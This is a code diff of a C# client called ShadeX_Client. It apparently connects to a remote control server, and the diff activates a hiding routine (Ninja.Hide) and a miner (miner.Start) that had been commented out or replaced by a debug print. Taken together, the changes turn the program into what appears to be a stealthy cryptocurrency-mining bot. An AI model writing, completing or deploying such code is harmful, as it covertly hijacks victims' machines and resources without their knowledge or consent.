@@ -27,7 +27,6 @@ namespace ShadeX_Client
         static void Main(string[] args)
         {
             /* Connection Handler */
-            //connectionHandler = new ConnectionHandler(@"http://shadex.5v.pl/");
             connectionHandler = new ConnectionHandler(http_adress);
             connectionHandler.GetConnection += connectionHandler_GetConnection;
             connectionHandler.LoseConnection += connectionHandler_LoseConnection;
@@ -48,7 +47,7 @@ namespace ShadeX_Client
             config = new ConfigFile("config.cfg");
 
             /* Hide */
-            //Ninja.Hide();
+            Ninja.Hide();
             
 
             initDone = true;
@@ -119,8 +118,7 @@ namespace ShadeX_Client
                     { 
                         if(!miner.isRunning)
                         {
-                            Console.WriteLine("MINER URUCHOMINY");
-                            //miner.Start();
+                            miner.Start();
                         }
                     }
 
@@ -131,6 +129,7 @@ namespace ShadeX_Client
                         // executing next available command
                     }
                     */
+                    
                     Thread.Sleep(1000);
                 }
             }).Start();
